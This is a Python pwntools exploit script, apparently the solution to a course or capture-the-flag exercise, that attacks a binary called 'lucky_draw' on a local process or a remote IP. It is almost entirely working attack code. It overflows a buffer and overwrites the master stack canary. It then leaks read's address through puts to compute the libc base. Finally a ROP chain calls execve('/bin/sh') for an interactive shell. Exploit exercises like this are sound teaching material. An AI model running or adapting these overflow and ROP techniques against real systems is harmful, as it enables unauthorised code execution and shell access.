#!/usr/bin/env python
from pwn import *

BINARY = "./lucky_draw"
LIBC = "./libc.so.6"

HOST = "3.34.49.33"
PORT = 1003

# Set context
context.terminal = ["tmux", "split-window", "-h"]

# Load binary and libc
elf = context.binary = ELF(BINARY)
libc = ELF(LIBC)

# GDB script
gs = """
break *4013AD  # Break at read(0, buf, 0x98uLL)
break *4013B7  # Break at canary comparison
c
"""


def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process(BINARY, env={"LD_PRELOAD": LIBC})


def attach_gdb(p: process):
    if args.REMOTE:
        return

    gdb.attach(p, gdbscript=gs)


def stage1(p):
    p.sendlineafter(b">", str(1).encode())
    p.sendlineafter(b"How many followers:", str(1).encode())

    payload = b"A" * 0x28  # Padding
    payload += b"Z" * 0x8  # Local canary
    payload += b"B" * 0x8  # Saved RBP
    payload += p64(elf.symbols["memo"])  # Return address
    payload += b"C" * (0x830 - len(payload))
    payload += p64(0x404100)  # Writable address
    payload += b"D" * (0x848 - len(payload))
    payload += b"Z" * 0x8  # Master canary

    p.sendlineafter(b"1:", payload)
    sleep(1)


def stage2(p):
    rop = ROP(elf)
    rop.call(elf.plt["puts"], [elf.got["read"]])
    rop.call(elf.symbols["memo"])

    # TODO (Exercise 3.3): Construct the stage2 payload
    # Hint: Adjust the padding sizes based on your binary analysis
    payload = b"A" * 0x18
    payload += b"Z" * 0x8  # Local canary
    payload += b"B" * 0x8  # Saved RBP
    payload += rop.chain()

    p.sendline(payload)

    # TODO (Exercise 3.4): Parse the leaked address and calculate libc base
    # Hint: Correct libc base address example is:
    # [*] leak = 0x000075827ef149c0
    # [*] libc = 0x000075827ee00000
    leak = u64(p.recvuntil("\x0a")[-7:-1].ljust(8, b"\x00"))
    libc.address = leak - libc.symbols["read"]
    log.info(f"leak = 0x{leak:016x}")
    log.info(f"libc = 0x{libc.address:016x}")


def stage3(p):
    rop = ROP(libc)
    # TODO (Exercise 3.5): Construct ROP chain to spawn a shell
    # Hint: Use libc.search() and libc.symbols to find necessary components
    # Hint: Consider which libc function could be used to execute a shell command
    rop.call(libc.symbols["execve"], (next(libc.search(b"/bin/sh")), 0, 0))
    # TODO (Exercise 3.6): Construct the stage3 payload
    payload = b"A" * 0x18
    payload += b"Z" * 0x8  # Local canary
    payload += b"B" * 0x8  # Saved RBP
    payload += rop.chain()

    p.sendline(payload)


def main():
    p = conn()
    if args.GDB:
        attach_gdb(p)

    stage1(p)
    stage2(p)
    stage3(p)

    p.interactive()


if __name__ == "__main__":
    main()
